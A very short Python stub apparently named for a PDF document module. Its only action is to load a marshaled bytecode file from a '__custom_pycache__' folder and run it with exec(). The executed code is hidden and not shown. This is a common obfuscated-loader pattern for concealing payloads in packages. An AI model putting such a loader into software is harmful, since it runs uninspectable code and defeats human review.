
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfDocument_ee3f62d935264c94934482cdac5bcc99.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
